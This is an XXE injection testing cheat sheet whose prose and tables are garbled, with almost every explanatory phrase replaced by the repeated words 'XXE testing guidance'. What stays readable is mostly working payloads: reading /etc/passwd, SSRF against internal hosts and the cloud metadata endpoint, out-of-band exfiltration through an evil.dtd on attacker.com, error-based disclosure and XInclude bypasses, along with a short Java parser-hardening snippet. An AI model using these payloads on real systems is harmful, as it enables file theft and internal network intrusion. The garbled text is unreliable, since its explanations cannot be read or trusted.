# Web XXE testing guidance - XXE（XML XXE testing guidance）

> XXE testing guidance: WooYun XXE testing guidance | XXE testing guidance web-injection.md

## XXE testing guidance、XXE (XMLXXE testing guidance)

### 4.1 XXE testing guidance

```
XMLXXE testing guidance -> XXE testing guidanceDTD/XXE testing guidance -> XXE testing guidance -> XXE testing guidance/SSRF/RCE
```

**XXE testing guidance**：XXE = XMLXXE testing guidance + XXE testing guidanceXMLXXE testing guidance

### 4.2 XXE testing guidance

**XXE testing guidance**

| XXE testing guidance | XXE testing guidance | XXE testing guidance |
|----------|----------|----------|
| APIXXE testing guidance | Content-TypeXXE testing guidance`text/xml`XXE testing guidance`application/xml` | RESTful API、SOAP WebXXE testing guidance |
| XXE testing guidance | SVGXXE testing guidance、DOCX/XLSX/PPTX(XXE testing guidanceZIPXXE testing guidanceXML) | XXE testing guidance、XXE testing guidance |
| XXE testing guidance | XMLXXE testing guidance、RSS/AtomXXE testing guidance | XXE testing guidance、XXE testing guidance |
| XXE testing guidance | SAMLXXE testing guidance、WebDAV、XMPP | SSOXXE testing guidance、XXE testing guidance |

**XXE testing guidance**

```
1. XXE testing guidanceXMLXXE testing guidance → XXE testing guidanceContent-TypeXXE testing guidanceapplication/xmlXXE testing guidance
2. XXE testing guidanceDTDXXE testing guidance → XXE testing guidance(XXE testing guidance)
3. XXE testing guidance → fileXXE testing guidance
4. XXE testing guidance → OOBXXE testing guidance(DNS/HTTPXXE testing guidance)
```

### 4.3 XXE testing guidancePayload

#### XXE testing guidance（XXE testing guidance）

```xml
< xml version="1.0" encoding="UTF-8" >
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

#### SSRFXXE testing guidance

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal:8080/">]>
<foo>&xxe;</foo>

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>
```

#### XXE testing guidance - OOBXXE testing guidance

```xml
<!-- XXE testing guidanceDTD (attackerXXE testing guidanceevil.dtd) -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>

<!-- evil.dtdXXE testing guidance: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/ d=%file;'>">
%eval;
%exfil;
```

#### XXE testing guidance

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % error "<!ENTITY &#x25; e SYSTEM 'file:///nonexistent/%file;'>">
  %error;
  %e;
]>
```

### 4.4 XXE testing guidance

| XXE testing guidance | XXE testing guidance | XXE testing guidance |
|----------|------|----------|
| XXE testing guidance | UTF-16BE/LE、UTF-7XXE testing guidanceXML | WAFXXE testing guidanceASCIIXXE testing guidance |
| XXE testing guidance | `%entity;`XXE testing guidance`&entity;` | XXE testing guidance`&` |
| XInclude | `<xi:include href="file:///etc/passwd"/>` | XXE testing guidanceDOCTYPEXXE testing guidance |
| SVGXXE testing guidance | SVGXXE testing guidanceXXEXXE testing guidance | XXE testing guidance |
| DOCX/XLSXXXE testing guidance | XXE testing guidanceOfficeXXE testing guidance`[Content_Types].xml` | XXE testing guidance |
| CDATAXXE testing guidance | XXE testing guidanceCDATAXXE testing guidance | XXE testing guidanceXMLXXE testing guidance |

### 4.5 XXE testing guidance

```java
// Java: XXE testing guidanceDTDXXE testing guidance
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

- XXE testing guidanceDTDXXE testing guidance（XXE testing guidance）
- XXE testing guidanceJSONXXE testing guidanceXMLXXE testing guidance
- XXE testing guidance、XXE testing guidanceXMLXXE testing guidance
- WAFXXE testing guidance`<!DOCTYPE`/`<!ENTITY`/`SYSTEM`XXE testing guidance

---

